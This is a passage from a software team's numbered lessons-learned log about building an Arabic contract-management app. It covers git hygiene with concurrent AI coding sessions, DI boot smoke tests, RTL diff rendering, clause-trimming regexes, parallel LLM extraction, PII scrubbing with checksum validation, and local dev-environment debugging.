During Phase 8.1 the work was built on a feature branch but kept **uncommitted** in the working tree. A separate **concurrent** Claude session operating in the SAME repo/working-dir checked out away from that branch (`reflog: feat/phase-8.1-ai-model-eval → fix/erp-crypto-roundtrip-test`), did unrelated ERP/docs work, rebased, and `pull --ff-only` advanced `main` — leaving HEAD on **main** with the 8.1 changes sitting uncommitted on main's working tree, and the feature branch stale + behind. The 8.1 work survived ONLY because there was **zero file overlap** with the concurrent work (no checkout/rebase conflict); with overlap it could have been clobbered or blocked. **Discipline:** (1) **commit work to its branch early** — uncommitted changes are not bound to a branch; they follow HEAD across switches, so they are at the mercy of any other session sharing the working dir; (2) **before any push, re-verify `git branch --show-current` + `git status` + the staged set** — never assume you are still on the branch you created (a self-audit caught HEAD-on-main here *before* the push and re-homed cleanly); (3) for genuinely parallel work, isolate with a separate **git worktree** so sessions don't share one HEAD. Re-homing was clean here (fast-forward the branch to current main + replay the uncommitted changes, after confirming zero overlap), but the safe default is to not leave work uncommitted in a shared dir.

### Lesson #186 — "1183 tests green" did NOT mean the backend boots — a missing module registration fails ONLY at real app bootstrap, which no test exercised; add a backend-boot smoke test that compiles the full Nest DI graph
Sub-slice 2a (PR #106) shipped a defect that made the backend **un-bootable**: `ContractsService` gained an `@InjectRepository(Clause)` constructor dependency, but `ContractsModule` never added `Clause` to its `TypeOrmModule.forFeature([...])` — so at real application bootstrap Nest threw `Nest can't resolve dependencies of the ContractsService (… ?) … "ClauseRepository" at index [17] is available in the ContractsModule context`. Yet the **full 1183-test suite stayed green**, because NO test bootstrapped the real Nest application: every spec either direct-instantiated the service with positional mocks (`new ContractsService(repoA, repoB, …)`) or built a partial `TestingModule` with only the providers under test — neither path resolves the whole module graph, so a missing `forFeature` registration is invisible. A missing registration only fails when Nest actually wires the app; the app was never RUN on 2a's code until 2b's build booted it and it crashed at startup. **Fix:** `app-boot.smoke.spec.ts` — `await Test.createTestingModule({ imports: [AppModule] }).compile()` — forcing Nest to eagerly instantiate EVERY provider/repository across ALL modules and resolve each constructor dependency. Proven **RED** (the can't-resolve error) without the fix, **GREEN** with it. It uses `synchronize:false` (never mutates the DB), `describe.skip`s in CI when `DATABASE_URL` is unset (needs real PG+Redis), and needs `--forceExit` locally (it opens real connections). The 2a defect was un-broken on `main` via hotfix PR #108, then the smoke test landed in 2b (PR #107) as the permanent guard. **The rule:** 'all tests green' does NOT mean 'the app boots' unless a test actually bootstraps the full DI graph; any service-graph change (a new injected dependency, new module wiring, a new provider) must keep the backend-boot smoke test GREEN.

### Lesson #187 — Classify "looks broken" as WRONG-DATA vs correct-data-bad-rendering by INSPECTING the code before deferring — a hunch that "styling will fix it" nearly shipped a real RTL bidi bug to a harder-to-fix layer
The 2b Arabic proposed-vs-current diff rendered list-markers / sub-article numbers / percents (`1-`, `7-1`, `15%`, `%`) **stranded at the left edge**, visually detached from their right-to-left Arabic lines. Both the reviewer and the implementer's first instinct was that this was a PRESENTATION-ONLY artifact of the bare/unstyled 2b modal that 2c's real card design would resolve — i.e. defer it. A **read-only code inspection** (not an eyeball, not a guess) proved otherwise: it was a real bidi bug in the SHARED `DiffView`. The content container used `unicode-bidi: plaintext` + `white-space: pre-wrap`, which makes the bidi algorithm resolve **each visual line as its own paragraph** from its first STRONG directional character; a line that is only a marker/number/percent has NO strong character, so it falls back to LTR and is placed at the left edge, detached from the surrounding RTL text. The diff DATA (`computeClauseDiff`) was already correct — the tokens concatenate to the full text with correct add/remove flags; only the rendering was wrong. Crucially, **2c's card design would NOT have fixed it** (it reuses the same `DiffView` content rendering), so deferring would only have moved the bidi bug into a more complex UI to debug later. **Fix (in 2b, shared `DiffView`):** one explicit paragraph direction `dir={rtl ? 'rtl' : 'ltr'}` (not per-line `plaintext`) so all lines share one bidi context, plus `unicode-bidi: isolate` on each diff sub-run so weak/neutral runs stay inline within the RTL flow; column labels moved out of the directional content. **The rule:** before deferring a 'looks broken' symptom to a later/other layer, inspect whether it is WRONG DATA or correct-data-bad-rendering, and whether the layer you'd defer to actually owns the fix — a 'styling will fix it' hunch nearly shipped a real rendering bug downstream.

### Lesson #188 — Confirm the load-bearing "reuse via thin adapter" assumption BEFORE building, and diff two independently-extracted clause sets by a STABLE domain key (section_number), not surrogate ids
2b's recon claimed the proposed-vs-current diff could REUSE `compareVersions`' algorithm 'via a thin adapter' rather than a parallel diff engine — a load-bearing assumption, so it was confirmed by inspection BEFORE building: `compareVersions`' diff body operated over plain clause arrays and only ~4 lines bound it to the `contract_versions` snapshot JSONB, so the inner logic extracted cleanly into a shared `computeClauseDiff(clausesA, clausesB, keyFn)` helper, with `compareVersions` refactored to call it and proven **byte-identical** afterward (its existing consumer test + a unit test asserting unchanged ADDED/REMOVED/MODIFIED/UNCHANGED + word-level output). The proposed-compare endpoint feeds the SAME helper with live-vs-proposed arrays. **One non-obvious matching rule:** proposed-vs-current must pair clauses by **`section_number`, NOT `clause_id`** — a guest's proposed clauses are a fresh AI extraction with brand-new `clause_id`s, so id-matching would classify every clause as removed+added (never modified); section-number matching yields real per-clause MODIFIED word-diffs. **The rule:** when a recon's plan rests on 'reuse via thin adapter,' verify the extractability (how few lines actually couple the logic to the old shape) before building; and when diffing two independently-extracted clause sets, match on a stable domain key, not on surrogate ids that differ across extractions.

### Lesson #189 — A backend code path that no test, mock, or UI ever EXERCISES is unverified no matter how green the suite — when a new UI drives a backend path for the first time, treat the SPECIFIC combination it enables as untested until a test proves it
The 2a `applyProposedVersion` ADD branch (for guest-ADDED clauses) branched purely on whether the proposed clause had a `replaces_contract_clause_id` target — it never read `edited_content`/`edited_title`, so a host who used **Merge & edit on a newly-ADDED clause** had their wording **SILENTLY DROPPED**: the guest's original was promoted as `APPROVED` while the UI reported success. This shipped in 2a and passed every 2a/2b test because **no test (and no UI) had ever exercised merge-edit ON an added clause** — the apply operation HAD tests (accept/edit/reject/add/remove) but not the `edit × added-clause` COMBINATION; 2c's review UI was the first surface to drive that path. It was found by **adversarial review during the 2c build**, not by the existing suite. **Fix:** the ADD branch now honors `edited_content`/`edited_title` and marks `EDITED` (mirrors the modify branch); a **RED→GREEN real-PG test** asserts the host's edited wording is promoted, NOT the guest original. This is the **fourth instance this arc** of the same failure family — dispatch≠completion (#180), the un-bootable module (#186), the RTL bidi stranding (#187), now add-edit: a path nothing actually exercises is unverified, and 'N tests green' says nothing about a combination no test drives. **The rule:** when a new UI exposes a backend path for the first time, treat that path as UNTESTED until a test drives the specific combination the UI enables — even when the broader operation already has tests.

### Lesson #190 — When Claude Design's interactive `/design-login` is unavailable, build against an EXPORTED design ZIP unzipped as a git-excluded reference, then close the fidelity gap at the human browser gate
2c's pixel target was a Claude Design mockup, but the design MCP's fetch needs an interactive **`/design-login`** that wasn't available in this environment (it errored 'needs design-system authorization'). **Fallback that worked:** the user EXPORTED the design as a ZIP from Claude Design; it was copied into the build worktree, unzipped into a **git-excluded `design-reference/` folder** (added to the worktree's resolved `info/exclude` so it never appears as stageable), and the UI was built directly against the exported HTML/CSS — which carries exact tokens, dimensions, colors, and all interaction states. The fidelity gap was then closed at the **human browser gate** (running app vs the design). Keep the zip + unzipped reference **OUT of the PR** (exclude or delete after building). A previously-authored, recon-grounded UI-SPEC doc is the secondary fallback if even the export can't reach the worktree. **The rule:** a missing interactive design-login does not block a design-faithful build — export → unzip-as-excluded-reference → build → verify at the browser gate.

### Lesson #191 — A whole real-PG suite failing with `beforeAll` connect-timeouts (while unit tests pass and the DB is healthy) is usually a STALE docker-VM IP, not a regression — run the specs INSIDE the backend container instead of chasing the host IP
Host-side real-PG runs target a docker-reachable IP because a host-native Postgres SHADOWS the docker one on loopback `:5432` (the `192.168.x` workaround). But **Docker Desktop REASSIGNS that VM IP across restarts** — a previously-working IP (e.g. `192.168.5.107`) silently became unreachable mid-engagement, and EVERY real-PG suite failed with `Exceeded timeout of 5000 ms for a hook` (the `beforeAll` DB connect hanging), while the pure-unit spec in the same run PASSED and `docker ps` showed the postgres container `Up … (healthy)`. The tell: **connect-timeouts on every real-PG suite, not assertion failures**, with healthy containers. **Fix that worked:** stop chasing the host IP and run the specs **INSIDE the backend container** (`docker exec sign-backend sh -c 'cd /app && npx jest … --runInBand --forceExit'`), where the container's own env resolves `postgres:5432` / `redis:6379` over the docker network — the full suite went 1184/1184. **The rule:** when an entire real-PG suite times out at `beforeAll` (not assertions) but unit tests pass and the DB container is healthy, suspect the stale docker-VM IP and run the tests inside the container, rather than debugging 'a regression' that isn't there.

### Lesson #192 — A label-driven cover-page trimmer that cuts at a marker which also appears INSIDE clause bodies silently DELETES real clauses — anchor on the first numbered clause marker (label-INDEPENDENT), drop body-substring markers, and make any clause-cutting trim LOUD
The cover/TOC trimmer (`document-processing.service.ts` → `trimCoverPages`) branched on the human-supplied `document_label`: a non-Conditions label took an "agreement" path that trimmed at the FIRST `تم الاتفاق` — but that bare phrase also occurs MID-BODY (e.g. `ما لم يتم الاتفاق على غير ذلك` inside clause 2). So a Conditions document MISLABELED **"Contract Agreement"** (the real Project4 GC+PC file) had everything before that body phrase cut, **silently deleting clauses 1 (`التعريفات`) and 2 (`قواعد العمل بالموقع`)** — the General Conditions list started at clause 3 and nothing surfaced the loss. **Two compounding faults:** (a) a DESTRUCTIVE trim decision trusted a human-supplied label, and (b) the marker set included a string that is a SUBSTRING of ordinary clause-body text. **Fix (B+C+D), extracted to a pure `computeCoverTrim` in `utils/cover-trim.util.ts`** (old `trimCoverPages` removed): **(B)** the first numbered clause-1 marker (`مادة`/`المادة`/`البند`+digit, `Article 1`, `Clause 1`, `^1[-.]`) is authoritative and is NEVER trimmed past — a genuine opener is honored only when it PRECEDES clause 1 (keeps a true agreement's preamble/party block), fully label-INDEPENDENT; **(C)** the bare `تم الاتفاق` marker is dropped — only the genuine openers `إنه في يوم` / `تم الاتفاق بين كل من` (which don't occur mid-body) remain; **(D)** an opener found AT/AFTER clause 1 trims at the clause (preserving clause 1) AND surfaces loudly — a `warning` log + the `cover_trim_clause_guard` quality flag (observability ONLY; it never parks the doc, parking stays gated on OCR flags). **Verified live** on the real document: a reprocess went **33 → 35 clauses**, clauses 1 & 2 restored, the GC list now runs 1–25 (PC 10 clauses intact); 10/10 unit tests, `tsc` clean. For this doc the C+B path did the work (the only "agreement" text was the bare phrase, now ignored); D is the safety net for the rarer "real opener after clause 1" case, exercised by the unit test. **This code-enforces the long-standing CLAUDE.md warning** ("NEVER use `تم الاتفاق` as the start marker for conditions documents"), which until now was only a comment. **The rule:** never let a destructive trim/cut decision depend on a human-supplied label OR on a marker that can appear inside the content it is meant to bound — anchor on the authoritative structural marker, and when a cut WOULD discard content past that anchor, make it loud (log + flag), never silent.

### Lesson #193 — Sequential per-chunk LLM calls are a LATENCY FLOOR, not a retry problem — parallelize behind a concurrency cap + a live-header rate-limit gate, and DON'T stack your retry layer on the SDK's built-in retries
Large-document clause extraction split a contract into ~N chunks and sent each to Anthropic in a plain `for` loop — one BLOCKING call after another. A clean, ZERO-retry run measured **~10 min for 5 chunks** (≈100–190 s of generation PER chunk, summed), and bad cases ballooned to **20–30 min** once transient 529/connection errors hit the backoff. Two root causes, two fixes. **A — the floor is sequential generation, so PARALLELIZE the calls:** `_extract_chunked` now builds every chunk prompt deterministically up-front (each prompt depends only on the chunk LIST, never on another chunk's RESULT), fires them through a `ThreadPoolExecutor` capped at `CLAUSE_EXTRACT_CONCURRENCY` (env, default 3), and merges via a factored `_merge_in_order` that runs the UNCHANGED dedup in chunk-INDEX order → **byte-identical output** (a unit test asserts parallel == sequential merge EVEN when completion order is inverted). A thread-safe `_RateLimitGate` reads the live `anthropic-ratelimit-*-remaining` headers off each (raw) response and pauses ALL threads when the window is nearly spent; a 429 `Retry-After` makes every thread back off — so the cap is the primary control and the gate the never-exceed safety net (no trading sequential slowness for a wall of 429s). **B — the retry TAIL was self-inflicted:** the manual 4-attempt loop (30/60/120 s) sat ON TOP of the SDK's DEFAULT `max_retries=2`, so one chunk could hit the API **up to 12 times** with compounding backoff. Pinned the SDK off (`Anthropic(..., max_retries=0)` = single retry authority), dropped manual backoff to **4/8/16 s** (capped), and made it honor `Retry-After`. **Result:** ~**1.9×** on a real 3-chunk doc (190 s wall-clock vs 360 s sequential-equivalent), scaling toward **~3×** on docs with more/even chunks — the speedup is bounded by the SLOWEST chunk (cap=3 over 3 UNEVEN chunks ≈ 1.9×). **Scoping fact:** parallelism only engages on the CHUNKED path (documents **> 30,000 chars**); a smaller doc takes the single-call path and is unchanged. **The rule:** when an async pipeline's latency floor is N independent LLM calls run one-at-a-time, the win is parallelism behind a concurrency cap + a live-header rate-limit gate, reassembled deterministically (index order) so output is provably identical — and before you tune backoff, check you aren't MULTIPLYING your own retry layer with the SDK's built-in one.

### Lesson #194 — Two regexes that must agree WILL drift: the cover-trim's clause-marker set lacked the `البند رقم (N)` / spaced-parens / line-anchoring the chunker's boundary regex already had — so it trimmed at a mid-body CROSS-REFERENCE and silently ate clause 1 (extends #192)
Lesson #192 fixed the label-driven cover-trim, but its `CLAUSE_MARKERS` (`cover-trim.util.ts`) and the clause-extractor's `_ARTICLE_BOUNDARY_RE` (`clause_extractor.py`) are TWO regexes that must recognize the SAME clause-heading formats — and they had **drifted**. The trim markers (`/البند\s*[\(\s]?[١-٩\d]/`) lacked three things the chunker regex already had/needed: (a) the optional `رقم` word (`(?:رقم\s*)?`), (b) a space after the bracket (`( 1 )`), and (c) **line-anchoring**. On Project8 — whose clause headings are ALL `البند رقم ( N )` (with `رقم` + spaces inside the parens) — **none of the real headings matched**, so the trimmer's FIRST match was a bare `البند (2)` **cross-reference** sitting inside clause 1's definitions body; it trimmed there and **silently deleted clause 1** (`التمهيد والمرفقات والتعريفات` — preamble/attachments/definitions). The doc came out **14** clauses, should be **15**; the MODEL was never at fault — clause 1 was gone before the model ever saw the text (single-call <30k doc, so not a chunking issue either). **Fix:** line-anchor the three Arabic markers (`^\s*` + `/m`) so a mid-body cross-reference is never a trim point, add `(?:رقم\s*)?`, and tolerate the space (`[\(\[]?\s*`) — i.e. bring the trim markers in line with `_ARTICLE_BOUNDARY_RE`'s intent (which is even commented *"only at the START of a line so cross-references are never treated as splits"*). English/numbered markers untouched. **Forward-only** (the trim runs at extraction; existing docs are unchanged until reprocess) and **backward-compatible** (`البند (1)` / `البند 1` / `مادة (1)` line-start headings match under both old and new). **Verified live:** Project8 reprocess **14 → 15**, clause 1 restored, `extracted_text` 22,880 → 27,375, stored text now starts at `البند رقم ( 1 ) التمهيد…`. **This EXTENDS lesson #192** — same silent-clause-loss family (a trim marker that matches a cross-reference eats a real clause), new trigger (a heading format the marker didn't recognize). **The rule:** when two regexes in different services must recognize the SAME structural markers (here the trimmer and the chunker both key on `مادة`/`البند` headings), keep them in ONE shared source or explicitly cross-check them — divergence silently loses data; and any clause-boundary matcher used to CUT text MUST be line-anchored so a mid-sentence cross-reference is never mistaken for a heading.

### Lesson #195 — Structured-PII detection in number-dense contract text MUST be validation-gated, not regex-only — and negative tests (invoice numbers surviving unscrubbed) matter as much as positives
Contracts are full of digit runs — invoice numbers, amounts, reference numbers, dates — that SHAPE-match national IDs and phone numbers. A regex-only scrubber in that environment eats legitimate contract numbers, and it does so SILENTLY: the analysis agents receive text with `[ID_1]` placeholders where a payment reference used to be, and answer quality degrades with no error anywhere. The Slice-1 scrubber (`ai-backend`, PR #122) therefore gates every structured-PII detector behind REAL validation, not just shape: actual Luhn check-digit verification for Saudi national IDs and Emirates IDs, actual MOD-97 verification for IBANs, structural validation (embedded birth-date validity + governorate code) for the Egyptian 14-digit ID — whose final check digit has NO verified public specification, and the code SAYS SO honestly in a comment rather than implementing a guessed algorithm and pretending — and a mandatory country-prefix for Qatari phone numbers, because a bare 8-digit run is far too false-positive-prone in contract text. The test suite treats false-positive control as a first-class requirement: negative tests assert that invoice numbers, monetary amounts, and dates SURVIVE unscrubbed, alongside the positive tests that real PII is caught. **The rule:** in number-dense domains, every structured-PII detector needs a validation gate (checksum, structural, or prefix) on top of the regex, an honest comment where no public validation spec exists, and negative tests proving legitimate look-alike numbers pass through untouched — a scrubber that over-matches corrupts downstream analysis silently, which is worse than a scrubber that under-matches loudly.

### Lesson #196 — Normalize Arabic-Indic digits for detection via a LENGTH-PRESERVING 1:1 translate, never NFKC — detected spans must map back to ORIGINAL string offsets
Arabic contracts carry phone numbers and IDs in Arabic-Indic (٠١٢٣٤٥٦٧٨٩) and Persian (۰۱۲۳۴۵۶۷۸۹) digits, which Western-digit regexes never match — so detection needs digit normalization. But the scrub/restore design is SPAN-BASED: detectors run on a normalized shadow copy and return character offsets, and the scrubber then replaces those spans in the ORIGINAL text (preserving the original Arabic-digit form inside the PII map so restore is byte-faithful). That only works if normalization is a strict 1:1 code-point translate (`str.translate` — every Arabic-Indic digit maps to exactly one ASCII digit), so offset `i` in the shadow copy IS offset `i` in the original. An NFKC-style normalization pass would also decompose ligatures and compatibility forms and CHANGE THE STRING LENGTH, silently shifting every detected span and making the scrubber replace the wrong characters — a corruption class that no per-detector test catches because each detector sees only the shadow text. **The rule:** when detection runs on a normalized copy but mutation happens on the original, the normalization MUST be length-preserving (1:1 translate, no NFKC, no insertion/deletion), and that invariant deserves its own test — offset fidelity is the load-bearing assumption of every span-based scrub/restore design.

### Lesson #197 — A branch stacked on an unmerged PR must rebase with `--onto` after the base squash-merges — a plain rebase replays the INHERITED commits as conflicting duplicates
The scrubbing branch (PR #122) was STACKED on the unmerged chokepoint branch (PR #118), so it inherited the chokepoint commits in its history. When PR #118 squash-merged, `main` gained the chokepoint CONTENT under a brand-new SHA (`148dbb3`) — and the stacked branch's inherited commits became duplicates that a plain `git rebase origin/main` would try to REPLAY on top of that squash, producing a wall of self-conflicts (every inherited hunk already applied). The correct idiom: `git rebase --onto origin/main <last-inherited-commit> <stacked-branch>` — replay ONLY the stacked branch's own commits onto the new main, skipping the inherited range entirely — then retarget the PR's base branch to `main` in the GitHub UI and `git push --force-with-lease`. Verify with two checks before pushing: `git log origin/main..HEAD --oneline` shows ONLY the stacked branch's own commits (no inherited ones), and `git diff origin/main...HEAD --stat` shows ONLY the stacked branch's files. **The rule:** for any stacked branch whose base PR squash-merges, rebase with `--onto <new-base> <last-inherited-commit>` (never a plain rebase), retarget the PR base, force-with-lease, and verify the commit list + diff footprint show only the branch's own work.

### Lesson #198 — Bind-mounted code ≠ running code for Python services — after merging ai-backend changes, restart the containers AND verify the new symbol is live in the running process
The ai-backend source is bind-mounted into its containers (`./ai-backend:/app`), which makes it easy to believe that landing code on `main` means the service is running it. It is not: uvicorn (FastAPI) and the Celery worker are long-lived Python processes holding already-imported modules in memory — a file changed on disk under them changes NOTHING until the process restarts (this is the Python sibling of the Node `nest --watch` stale-snapshot family, lessons #138/#147, minus any watch mode at all). After merging the `_call_model` chokepoint + scrubbing PRs, the running containers were still executing the pre-merge module graph. The discipline is two steps, and the second is the one that gets skipped: (1) restart the service containers (`docker restart sign-ai-backend sign-celery-worker`); (2) VERIFY the new symbol is live in the running container, not just present on disk — e.g. `docker exec sign-celery-worker python -c "import inspect; from app.agents.base_agent import BaseAgent; print(inspect.signature(BaseAgent._call_model))"` and confirm the new `provider=`/`scrub=` parameters appear. Disk-level checks (`grep` in the mounted volume) prove nothing about the process. **The rule:** for bind-mounted Python services, every code landing ends with a container restart PLUS an in-process symbol check (signature/attribute inspect inside the running container) — "the file is on disk" and "the process is running it" are different claims, and only the second one matters.

### Lesson #199 — Chunk-reassembly must dedup on normalized CONTENT (not section_number/title) and stitch split clauses only behind an adjacent + same-section + junction-overlap guard — section-number sameness ALONE is the GC/PC collision trap
A large Arabic contract is extracted per-chunk, then the per-chunk clause lists are reassembled (`_merge_in_order`) and adjacent partials of one clause split across a chunk boundary are stitched back (`_stitch_split_clauses` / `_content_overlap_merge`) in `ai-backend/app/agents/clause_extractor.py` (PR #117). Two design rules keep this safe, and both are counter-intuitive. **(1) Dedup keys on NORMALIZED CONTENT, never on `section_number` or `title`.** A combined General-Conditions + Particular-Conditions file legitimately holds a GC `بند 7` AND a PC `بند 7` — same number, often same title, DIFFERENT content — so keying dedup on the number/title would silently drop one of them (real PC-clause loss, no error anywhere). Keying on normalized content (NFKC + whitespace-collapsed) keeps both distinct clauses while still merging a TRUE chunk-overlap duplicate (the same clause re-emitted at a chunk boundary is byte-identical after normalization); every drop is loud (`logger.warning`) + counted in the `clause_dedup_dropped:<n>` flag. **(2) Stitching requires ALL THREE guards — adjacent in the list AND same leading section number AND a genuine junction content-overlap** (a substantial contiguous block sitting at partial-1's END and partial-2's START). Section-number sameness ALONE is exactly the GC/PC collision danger; two distinct same-number clauses must NEVER be merged. A stitch raises `split_clause:<n>`; a بند numbering RESTART (a low number reappearing after a higher one) raises `combined_conditions_file` (GC+PC in one file — policy is separate-file upload; the pipeline flags, never reroutes). **Known limitation, NOT fully solved (backlog):** the stitch SIZE threshold and the chunker's handling of very large clauses / multi-article oversized blocks still mis-handle edge cases — a large clause split can go un-stitched (the size gate scales with clause size while the chunk overlap is a fixed ~200 chars), and an en-dash sub-article split can over-fragment a multi-article block and drop an orphaned continuation (text loss); investigated but NOT shipped (see `docs/stitch-threshold-large-clause-investigation.md`, `docs/no-overlap-split-investigation.md`). **The rule:** when reassembling independently-extracted chunk outputs, dedup and merge on CONTENT identity, never on a structural label (`section_number`/`title`) that legitimately repeats across a document's sub-parts — and gate every clause-merging heuristic on real overlap evidence, not label sameness, or you silently destroy the very clauses the document duplicates by design.

### Lesson #200 — An empty table hid a fully-broken production feature, and an un-generalized fix (fenced-JSON parsing, #166) recurred verbatim in a new agent — exercise features on REAL data, and generalize class-of-bug fixes
The per-clause risk-analysis feature (`risk_analyzer.py` agent → `finalizeReview` → `pollAndSaveRisks` → `saveAiRiskAsRow` writer) had NEVER produced a single persisted risk row: `risk_analyses` was empty because no contract had been review-finalized, and that emptiness HID two independent, always-on bugs — both exposed only when the Phase-8.3 pre-labeling pass first drove the writer end-to-end on real data (PR #126). **Bug (a):** `RiskAnalyzerAgent.analyze()` did a bare `json.loads()` on the model's ```json-fenced output, so it raised and returned **0 risks on every call**. The fix is a fence-/truncation-tolerant `_parse_risk_array` (strip the fence, isolate the outermost `[...]`, salvage complete objects before a `max_tokens` cutoff), leaving the sanctioned `_call_model(scrub=True, …)` chokepoint untouched — only the response-text parse changed. CRITICALLY this is a VERBATIM recurrence of lesson #166 ("Claude fenced JSON parsing", learned in the Legal Corpus work): the earlier fix was applied to that one agent and never generalized, so the identical bug shipped again in a different agent. **Bug (b):** the writer stored the AI-echoed `clauses.id` into `risk_analyses.contract_clause_id`, which FKs to `contract_clauses(id)` — zero `clauses.id` values are valid junction ids, so the first real insert would have thrown `FK_risk_analyses_clause`. The fix maps `clauses.id → the contract_clauses junction id` via `findOne({contract_id, clause_id})` (null when unresolvable — the row still saves, never an FK crash), proven with a rolled-back real-PG insert (`clauses.id → FK violation`, `contract_clauses.id → success`). Both bugs were invisible to a green suite because the writer tests MOCKED the repos (no real insert, no real model output). **The rule:** an empty table is NOT evidence a feature works — it can hide a feature that has never functioned; exercise every write path on real data (real insert, real model output) before trusting it. And when you fix a CLASS of bug (fenced-JSON parsing, id→FK mapping), GENERALIZE it — a fix pinned to one agent/call-site WILL recur at the next site that copied the pattern; a shared helper or a guard that covers the whole class is the only thing that stops the recurrence.

### Lesson #201 — Phase-8.3 annotation review tooling: editable risk tab (17 clause-type categories, not the 8 broad buckets) + party swap/tracking — and the missing category translations were an APP-WIDE gap, not feature-local
Two review/annotation features shipped together (PR #130), each a permanent product capability, and the build surfaced an app-wide i18n/RTL truth. **(1) Editable Risk Analysis tab** — each risk card's LEVEL (High/Medium/Low) and CATEGORY are now human-correctable dropdowns. The category list uses the **17 clause-type labels** (`CLAUSE_TYPE_LABELS`), NOT the 8 broad `risk_categories` buckets — a deliberate decision made after querying the REAL corpus: the AI had produced ~15 granular free-text categories (`Payment Terms`, `Performance Bond`, `Notice Period`, `Liability Cap`, …) that map cleanly onto the clause types and keep risk labels consistent with clause labels, whereas the 8 buckets are coarse and none matched the AI's values. Edits **reuse the existing `PATCH /risk-analysis/:id` endpoint** (a focused annotate route, org-walled via `findInOrg` — NOT the L/I `:id/override` path with its drift/learned-baseline machinery) and preserve the AI ORIGINAL by snapshotting it ONCE on the first edit: `risk_analyses` gained `is_edited_by_user` + `original_risk_level` + `original_risk_category` — the was_corrected training signal. **(2) Party editing** — a **Swap First⇄Second** button (crosses the two draft name inputs, review-then-Save) + correction tracking (`original_party_first_name` / `original_party_second_name` + `is_parties_edited_by_user`, snapshot-once). Party-NAME editing already existed (`PUT /contracts/:id/parties`); only the swap + the tracking were new. The **root reversed-party EXTRACTION bug** (a backend regex heuristic in `document-processing.service.ts` mis-ordering first/second on some Arabic contracts, e.g. أوراسكوم shown as الطرف الثاني when the doc said الطرف الأول) is SEPARATE and stays on the backlog — the tooling makes the mistake CORRECTABLE, it does not fix the extractor. **(3) The app-wide i18n/RTL finding (the real lesson):** the 17 clause-type category labels had **NO Arabic (or French) translation anywhere** — a gap that affected the ALREADY-SHIPPED clause-type dropdown (clause review card + clause library page), not just the new risk dropdown. Fixing it properly — a shared `clauseTypeLabel(value, t)` helper + a single `clauseType.*` i18n block (en/ar/fr) + `ltr:left-0 rtl:right-0` + `text-start` on the dropdown menus — fixed the WHOLE app's category labels in Arabic AND fixed RTL dropdown positioning app-wide, in one change (reusing the existing `portfolio.riskLevel.*` keys for the level labels, already translated). **The rule:** a missing-translation / broken-RTL gap is often APP-WIDE, not feature-local — a label source that a new feature reuses may have been silently English-only (and mis-positioned in RTL) everywhere it was already used; fix it at the SHARED source, not just in the new surface. **OPEN / not-yet-verified:** the Arabic (and French) `clauseType.*` category terms and the `parties.swap` label are **DRAFT** starting values, marked `_TODO` in `ar`/`fr` `common.json` — **pending Youssef's FIDIC legal-terminology review before they are final.** Both features are additive-only (migrations `1764000000001` risk + `1765000000001` parties, IF NOT EXISTS, no backfill — the 1,061 existing `risk_analyses` rows + all `contracts` untouched); clauses/clause_types and the PR #126 risk write path are untouched.

### Lesson #202 — A Claude Design export SUPERSEDES the older written UI-SPEC it grew from — but cross-check both: the design can also promise capability the current slice doesn't have
The guest-chat frontend had two references: an earlier written UI spec (`guest-ai-assistant-UI-SPEC.md`, 2026-06-30) and the later Claude Design export (`Guest_AI_Assistant.html`). Where they conflicted — the suggested-question set, the panel title ("SIGN AI Assistant" vs the spec's recommended "Contract Assistant") — the design export is the refined, human-iterated artifact and WINS; building to the stale spec would have shipped copy the design review had already replaced. But the supersession is not blind: the design's "what can this assistant see?" copy mentioned COMMENTS in the AI's context — a Slice-3 capability the shipped Slice-1 backend deliberately excludes — and was DROPPED from the build so the UI never promises what the backend doesn't deliver. **The rule:** when a design export and an earlier spec conflict, build to the design export (it is the newer, reviewed artifact) — but audit ITS copy against the actually-shipped backend contract too; each reference can be stale on a different axis.

### Lesson #203 — Frontend copy and states must reflect only what the backend ACTUALLY delivers in that slice — honest-data-only beats cosmetic completeness
The guest chat's quota pill ("N of 20 questions left today") is driven exclusively by the REAL `{remaining, cap}` fields on each send response. The history endpoint does NOT return quota, so on panel open the pill simply doesn't render until the first send of the session — rather than faking a "20 of 20" the frontend cannot truthfully know (the guest may have spent quota in a prior session or another tab). Same principle drove dropping the design's comments mention (lesson #201) and swapping the host's helper line ("…and knowledge base") for guest copy that only claims contract-grounding. **The rule:** every number, promise, and capability the UI shows must be traceable to a field the backend actually returned in THIS slice; when the data isn't available, show nothing rather than a plausible fabrication — a cosmetic placeholder that can be wrong is a trust bug waiting to be noticed.

### Lesson #204 — DEV-ENV: a worktree dev server on a non-allowlisted port is CORS-blocked by the backend — the browser shows a generic app error while curl works perfectly
The Slice-2 worktree vite server was parked on port 5179; the backend's dev CORS allowlist permits only the canonical frontend origin (5173). The browser blocked the guest viewer's FIRST api call at preflight (no `Access-Control-Allow-Origin` for 5179), axios surfaced a status-less network error, and the app rendered its generic "could not load" screen — indistinguishable, to the user, from a real data/auth failure. Server-side curl of the identical flow returned clean 200s (curl doesn't enforce CORS), which is the diagnostic tell: browser fails + curl succeeds + no status on the axios error = origin problem, not code or data. Fix: serve the worktree app ON the allowed origin (park the docker frontend with `docker stop sign-frontend`, run the worktree vite on 5173 `--strictPort`, restore with `docker start sign-frontend` after the gate). **The rule:** before diagnosing a browser-only "load failed" as a code or data bug, preflight the exact call with curl `-H "Origin: <dev-origin>"` and compare against the allowed origin — a worktree dev server must either run on an allowlisted port or be added to the allowlist deliberately, never debugged as an app defect.

### Lesson #205 — DEV-ENV: ~170-char base64url invitation tokens mangle on copy/paste — "invalid or expired" can mean a clipped URL, not a dead token (exchange is idempotent and does NOT burn tokens)
A guest invitation link died in the browser with "invalid or has expired" — yet the invitation row was PENDING (never exchanged, not revoked, not expired) and the very same token exchanged 200 via curl. The token was always valid; the pasted URL had been mangled in transit (the tokens are ~170 chars of base64url with `-`/`_` characters — one linebreak, truncation, or smart-punctuation substitution breaks the HMAC signature, and the endpoint's deliberate single-generic-401 posture reports it as "invalid" without distinguishing which axis failed). Two facts worth banking from the same investigation: exchange is REPEATABLE within TTL by design (idempotent `accepted_at` stamp — verified in `guest-invitation.service.ts`), so re-opening a link never burns it; and the single-generic-401 means client-side URL corruption is INDISTINGUISHABLE from expiry/revocation at the UI. **The rule:** when a signed-token link fails in a browser, first re-verify the exact stored token server-side (curl the exchange) and check the row's actual state before assuming consumption or expiry — and always hand off long base64url links as one unbroken line.

### Lesson #206 — Security recon for feeding sensitive data to an external boundary: find the ONE filtered path, confirm the consumer can use only it, and NAME the dangerous path so it is avoided by construction
